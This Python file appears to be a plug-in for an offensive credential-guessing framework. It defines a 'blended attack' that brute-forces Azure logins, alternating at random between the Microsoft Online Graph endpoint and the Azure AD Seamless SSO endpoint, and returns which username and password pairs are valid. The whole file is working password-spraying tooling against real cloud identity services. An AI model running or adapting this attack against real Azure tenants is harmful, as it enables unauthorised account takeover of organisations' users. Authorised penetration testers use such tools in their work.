import re
from random import randint
from bfg.data import loadAzureSSOSoap
from bfg.args import http as http_args
from bfg.shortcuts.http import HTTPModule, handleUA
from bfg.modules.http.ms_graph import module as graph
from bfg.modules.http.azure_ad_seamless_sso import module as sso

def msol_url():
    '''Return an argparse argument for the MSOL URL.
    '''

    return http_args.url(
        name_or_flags=('--url',),
        required=False,
        default=graph.MSONLINE_URL,
        help='Microsoft Online URL to target. Default: %(default)s')

def azure_sso_url():
    '''Return an argparse argument for the Azure SSO URL.
    '''

    return http_args.url(
        name_or_flags=('--azure-sso-url',),
        required=False,
        default=sso.AZURE_SSO_URL,
        help='Azure SSO URL to target. Default: %(default)s')

class Module(HTTPModule):

    brief_description = 'Blended attack against Azure'

    description = (
        'Brute force various Azure endpoints:\n'
        ' - Graph'
        ' - Seamless SSO')

    args = [msol_url(), azure_sso_url()] + \
        http_args.getDefaults('url', invert=True)

    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]

    references = []

    def __post_init__(self, azure_sso_url, *args, **kwargs):

        self.msol_url = self.url
        self.azure_sso_url = azure_sso_url

    @handleUA 
    def __call__(self, username, password, *args, **kwargs):
        '''Proxy the call request up to the Session object to perform
        authentication.
        '''

        # Is this AI?
        if randint(0,1):
            Session = graph.Session
            url = self.msol_url
        else:
            Session = sso.Session
            url = self.azure_sso_url

        session = Session(url=url,
                headers=self.headers,
                verify_ssl=self.verify_ssl,
                allow_redirects=self.allow_redirects)

        if self.proxies:
            session.proxies.update(self.proxies)

        outcome, valid_account, events = session.authenticate(username,
                password)

        events = events if events else []

        return dict(outcome=outcome,
                username=username,
                password=password,
                actionable=valid_account,
                events=events)




